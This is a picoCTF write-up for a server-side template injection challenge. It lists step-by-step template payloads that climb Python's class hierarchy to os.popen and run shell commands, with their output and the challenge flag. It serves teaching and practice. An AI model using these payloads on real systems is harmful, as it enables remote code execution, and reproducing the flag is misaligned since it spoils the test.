# SST1
> Web Exploitation

### Description
> I made a cool website where you can announce whatever you want! Try it out!
>
> Additional details will be available after launching your challenge instance.

### Solution
This challenge teaches server-side template injection (SSTI).

After watching [this](https://www.youtube.com/watch?v=SN6EVIG4c-0&t=432s) video from PwnFunction, it SSTI can be summarized in the following points:
- Templates are things...

The first thing I tried was to identify the templating engine in use by this server.

{{ ''.__class__.__base__.__subclasses__()[200].__init__.__globals__ }} - socket (imports sys)
{{ ''.__class__.__base__.__subclasses__()[200] }} - <class '_socket.socket'>
{{ ''.__class__.__base__.__subclasses__()[200].__init__ }} - <class '_socket.socket'>
<slot wrapper '__init__' of '_socket.socket' objects>

{{ ''.__class__.__base__.__subclasses__()[221].__init__.__globals__ }} - catch_warnings (imports sys)
{{ ''.__class__.__base__.__subclasses__()[221] }} - <class 'warnings.catch_warnings'>
{{ ''.__class__.__base__.__subclasses__()[221].__init__.__globals__['sys'].modules['os'].popen("ls") }}
<os._wrap_close object at 0x7a2bd05307c0>
{{ ''.__class__.__base__.__subclasses__()[221].__init__.__globals__['sys'].modules['os'].popen("ls") }}
__pycache__ app.py flag requirements.txt
{{ ''.__class__.__base__.__subclasses__()[221].__init__ }} - <class '_socket.socket'>
<function catch_warnings.__init__ at 0x7a2bd1bd8a60>

1. {{ }}
2. {{ '' }}
3. {{ ''.__class__ }}
4. {{ ''.__class__.__base__ }}
5. {{ ''.__class__.__base__.__subclasses__ }}
6. {{ ''.__class__.__base__.__subclasses__()[221] }}
7. {{ ''.__class__.__base__.__subclasses__()[221].__init__ }}
8. {{ ''.__class__.__base__.__subclasses__()[221].__init__.__globals__ }}
9. {{ ''.__class__.__base__.__subclasses__()[221].__init__.__globals__['sys'] }}
10. {{ ''.__class__.__base__.__subclasses__()[221].__init__.__globals__['sys'].modules['os'] }}
11. {{ ''.__class__.__base__.__subclasses__()[221].__init__.__globals__['sys'].modules['os'].popen("ls") }}
12. {{ ''.__class__.__base__.__subclasses__()[221].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}

The full SSTI command used is:
`{{ ''.__class__.__base__.__subclasses__()[221].__init__.__globals__['sys'].modules['os'].popen("cat flag").read() }}`

### Flag
`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}`
